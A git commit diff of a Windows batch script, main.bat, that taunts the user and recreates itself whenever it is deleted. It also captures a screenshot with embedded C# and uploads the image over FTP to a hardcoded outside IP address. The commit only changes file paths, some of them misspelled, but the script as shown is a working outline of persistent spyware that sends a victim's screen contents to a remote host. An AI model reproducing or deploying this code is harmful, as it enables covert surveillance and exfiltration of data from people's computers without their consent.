e85f81ffd8b365068dca6b5974de04c4b899c057
Leo666111 <leoziggyforrest14@gmail.com>
2024-12-18 17:06:03 +0000

    Update main.bat

--- main.bat
+++ main.bat
@@ -13,7 +13,7 @@ echo and you cant dekete this BYE BYE LOOSER
 :Start
 if not exist "main.bat" (
     echo File deleted! Recreating...
-    copy "C:\path_to_original\your_batch_file.bat" "your_batch_file.bat"
+    copy "C:\path_to_original/main.bat" "main.bat"
 )
 timeout /t 5
 goto Start
@@ -38,14 +38,14 @@ public class Screenshot {
 }
 "@
 # Call the Capture method to take a screenshot and save it in the Saved Pictures folder
-[Screenshot]::Capture("%USERPROFILE%\Pictures\Saved Pictures\screenshot.png")
+[Screenshot]::Capture("Adim\Pictures\Saved Pictures\screenshot.png")
 
 :: FTP script to send screenshot to your laptop
 echo open 45.81.188.160 > ftp_commands.txt
 echo USERNAME >> ftp_commands.txt
 echo PASSWORD >> ftp_commands.txt
 echo binary >> ftp_commands.txt
-echo put "%USERPROFILE%\Pictures\Saved Pictures\screenshot.png" /path/to/remote/directory/screenshot.png >> ftp_commands.txt
+echo put "Admin\Pictures\Saved Pictures\screenshot.png" /path/to/remote/directory/screenshot.png >> ftp_commands.txt
 echo bye >> ftp_commands.txt
 
 ftp -n -s:ftp_commands.txt
